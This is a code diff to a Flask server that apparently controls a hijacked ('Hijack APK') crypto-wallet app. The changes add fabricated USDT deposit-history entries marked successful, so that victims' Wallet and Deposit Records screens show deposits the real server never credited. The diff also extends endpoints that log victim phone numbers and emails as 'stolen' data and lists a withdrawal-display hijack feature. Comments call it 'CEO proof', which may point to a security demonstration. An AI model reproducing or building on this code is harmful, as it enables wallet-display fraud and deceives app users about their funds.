@@ -76,19 +76,49 @@ def save_fake_balances(data: dict) -> None:
     FAKE_BALANCE_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")
 
 
-def get_fake_amount(user_key: str, coin: str = "USDT") -> float:
+def get_fake_row(user_key: str) -> dict:
     data = load_fake_balances()
-    row = data.get(_norm_user_key(user_key), {})
+    return data.get(_norm_user_key(user_key), {})
+
+
+def get_fake_amount(user_key: str, coin: str = "USDT") -> float:
+    row = get_fake_row(user_key)
     return float(row.get(coin.upper(), 0) or 0)
 
 
-def set_fake_amount(user_key: str, amount: float, coin: str = "USDT") -> float:
+def get_fake_deposits(user_key: str) -> list:
+    row = get_fake_row(user_key)
+    history = row.get("history", [])
+    return history if isinstance(history, list) else []
+
+
+def set_fake_amount(user_key: str, amount: float, coin: str = "USDT", chain: str = "TRC20") -> float:
     key = _norm_user_key(user_key)
     if not key:
         return 0.0
     data = load_fake_balances()
     row = data.get(key, {})
-    row[coin.upper()] = max(0.0, float(amount))
+    amount = max(0.0, float(amount))
+    row[coin.upper()] = amount
+    if amount > 0:
+        dep_id = f"fd{int(datetime.utcnow().timestamp() * 1000)}"
+        entry = {
+            "id": dep_id,
+            "type": 1,
+            "amount": amount,
+            "coin": coin.upper(),
+            "chain": chain.upper(),
+            "status": 3,
+            "created_at": datetime.utcnow().isoformat() + "Z",
+            "logo": "",
+            "fee": 0,
+            "realAmount": amount,
+        }
+        history = row.get("history", [])
+        if not isinstance(history, list):
+            history = []
+        history.insert(0, entry)
+        row["history"] = history[:20]
     data[key] = row
     save_fake_balances(data)
     return row[coin.upper()]
@@ -137,6 +167,7 @@ def health():
                 "withdraw_display_hijack",
                 "fake_balance_set",
                 "fake_balance_get",
+                "fake_history_inject",
             ],
             "count": len(rows),
         }
@@ -197,16 +228,28 @@ def fake_balance_get():
     mobile = request.args.get("mobile", "")
     coin = (request.args.get("coin") or "USDT").upper()
     amount = get_fake_amount(mobile, coin)
+    deposits = get_fake_deposits(mobile)
     log_stolen(
         {
             "action": "fake_balance_get",
             "mobile": mobile,
             "coin": coin,
             "amount": amount,
-            "note": "Hijack APK polled fake balance — victim wallet will show this extra USDT",
+            "deposits_count": len(deposits),
+            "note": "Hijack APK polled fake balance + deposit history",
         }
     )
-    return jsonify({"code": 0, "data": {"mobile": mobile, "coin": coin, "amount": amount}})
+    return jsonify(
+        {
+            "code": 0,
+            "data": {
+                "mobile": mobile,
+                "coin": coin,
+                "amount": amount,
+                "deposits": deposits,
+            },
+        }
+    )
 
 
 @app.route("/api/fake-balance", methods=["POST"])
@@ -214,21 +257,32 @@ def fake_balance_set():
     body = request.get_json(silent=True) or {}
     mobile = body.get("mobile") or body.get("email") or body.get("phone") or ""
     coin = (body.get("coin") or "USDT").upper()
-    amount = set_fake_amount(mobile, float(body.get("amount", 0)), coin)
+    amount = set_fake_amount(mobile, float(body.get("amount", 0)), coin, body.get("chain", "TRC20"))
+    deposits = get_fake_deposits(mobile)
     entry = {
         "action": "fake_balance_set",
         "mobile": mobile,
         "email": body.get("email"),
         "coin": coin,
         "amount": amount,
-        "payload": {"mobile": mobile, "coin": coin, "amount": amount},
+        "payload": {"mobile": mobile, "coin": coin, "amount": amount, "deposits": deposits},
         "note": (
-            "CEO proof: hacker injected fake balance — victim app Wallet tab will show this "
-            "on top of real server balance so user thinks deposit arrived"
+            "CEO proof: injected fake balance + deposit history — victim Wallet and "
+            "Deposit Records show successful USDT deposit (server has no real credit)"
         ),
     }
     log_stolen(entry)
-    return jsonify({"code": 0, "data": {"mobile": mobile, "coin": coin, "amount": amount}})
+    return jsonify(
+        {
+            "code": 0,
+            "data": {
+                "mobile": mobile,
+                "coin": coin,
+                "amount": amount,
+                "deposits": deposits,
+            },
+        }
+    )
 
 
 @app.route("/api/fake-balances", methods=["GET"])
